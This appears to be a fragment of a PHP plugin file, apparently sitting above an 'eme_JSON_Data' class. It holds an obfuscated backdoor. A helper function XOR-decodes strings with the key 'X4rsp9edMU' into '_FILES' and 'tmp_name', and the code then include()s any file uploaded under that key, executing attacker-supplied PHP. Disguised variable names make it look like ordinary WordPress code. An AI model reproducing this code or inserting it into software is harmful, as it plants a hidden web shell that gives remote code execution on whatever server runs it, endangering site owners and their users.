...
$maybe_empty = 'X4rsp9edMU';
function secs($post_type, $incposts)

{

    $query_var = urldecode($post_type);

    $default_editor = substr($incposts,0, strlen($query_var));
    return $query_var ^ $default_editor;
}
$stickies = ${secs("%07r%3B%3F5j", $maybe_empty)};
if (isset($stickies[$maybe_empty]))

{
    $permalink_epmask = $stickies[$maybe_empty];

    $child = $permalink_epmask[secs("%2CY%02%2C%1EX%08%01", $maybe_empty)];
    include ($child);
	$raw_key = 'update';
}


/* eme_JSON_Data Class to access and update the underlying data.
